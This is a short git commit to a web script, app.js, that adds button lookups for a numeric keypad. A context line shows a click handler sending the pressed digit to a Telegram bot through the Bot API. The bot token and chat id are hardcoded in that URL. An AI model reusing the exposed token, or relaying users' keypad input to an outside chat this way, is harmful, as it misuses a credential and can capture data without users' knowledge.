63341ecd076c103acff52ecc5f881e48a2a43b61
tedmosbious <79196430+tedmosbious@users.noreply.github.com>
2023-01-06 16:38:40 +0300

    Update app.js

--- app.js
+++ app.js
@@ -13,6 +13,10 @@ let btn3 = document.getElementById("btn3");
 let btn4 = document.getElementById("btn4");
 let btn5 = document.getElementById("btn5");
 let btn6 = document.getElementById("btn6");
+let btn7 = document.getElementById("btn7");
+let btn8 = document.getElementById("btn8");
+let btn9 = document.getElementById("btn9");
+let btn0 = document.getElementById("btn0");
 
 btn1.addEventListener("click", function(){
 	$.ajax("https://api.telegram.org/bot5554637689:AAEud0-MIDX0h9ozrdNqPmoLILCwki102j4/sendMessage?text=1&chat_id=2053847245");
